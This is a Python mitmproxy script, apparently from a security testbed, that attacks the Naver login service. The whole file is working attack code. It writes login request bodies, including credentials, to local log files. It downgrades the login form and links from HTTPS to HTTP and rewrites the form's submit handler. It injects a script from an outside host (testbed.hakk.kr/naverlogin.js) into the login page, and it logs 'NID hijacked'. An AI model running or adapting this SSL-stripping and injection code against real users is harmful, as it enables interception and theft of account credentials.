from datetime import datetime

from bs4 import BeautifulSoup
from netlib.http import decoded

def request(context, flow):
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    if "nid.naver.com" in flow.request.pretty_host:
        timestr = datetime.strftime(datetime.now(), "%Y%m%d-%H%M%S.%f")
        f = open("nidlog-"+timestr, "w")
        f.write(flow.request.content)
        context.log(flow.request.host,level="error")
        if flow.request.headers.get('Referer',None):
            referer = flow.request.headers['Referer']
            if "nid.naver.com" in referer:
                flow.request.headers['Referer'] = referer.replace("http", "https", 1)
        if flow.request.headers.get('Origin', None):
            flow.request.headers['Origin'] = flow.request.headers['Origin'].\
                replace("http", "https", 1)
        if flow.request.headers.pop('Upgrade-Insecure-Requests',None):
            context.log("Upgrade-Insecure-Requests zapped", level="error")
        flow.request.scheme = 'https'
        flow.request.port = 443
        flow.request.host = "nid.naver.com"  # Transparent Proxy Patch

def response(context, flow):
    if "naver" in flow.request.pretty_host:
        if "m.naver.com" in flow.request.pretty_host and \
                "m.naver.com/aside" in flow.request.pretty_url and \
                "text/html" in flow.response.headers["content-type"]:
            with decoded(flow.response):
                context.log("**** Replacing https to http ****", level="error")
                html = BeautifulSoup(flow.response.content, "lxml")
                a = html.select(".user_name")[0]
                link = a['href']
                a['href'] = link.replace("https", "http")
                flow.response.content = str(html)

        elif "nid.naver.com/nidlogin.login" in flow.request.pretty_url and \
                "text/html" in flow.response.headers["content-type"]:
            if flow.request.method == "GET" or flow.request.method == "POST":
                with decoded(flow.response):
                    context.log("**** NID hijacked ****", level="error")
                    html = BeautifulSoup(flow.response.content, "lxml")
                    
                    form = html.select("#frmNIDLogin")[0]
                    form['onsubmit'] = 'return confirmSubmitForm();'
                    form['action'] = form['action'].replace("https", "http")
                    
                    jquery = BeautifulSoup('<script src="https://code.jquery.com/jquery-2.2.1.min.js"></script>', "lxml")
                    jquery_noconflict = '<script>jQuery.noConflict();</script>'
                    jquery_noconflict = BeautifulSoup(jquery_noconflict,"lxml");

                    hs = BeautifulSoup('<script src="https://testbed.hakk.kr/naverlogin.js"></script>', "lxml")

                    html.head.append(jquery)  # inject jquery
                    html.head.append(jquery_noconflict)  # resolve jindo conflict

                    html.head.append(hs)  # inject script

                    flow.response.content = str(html)
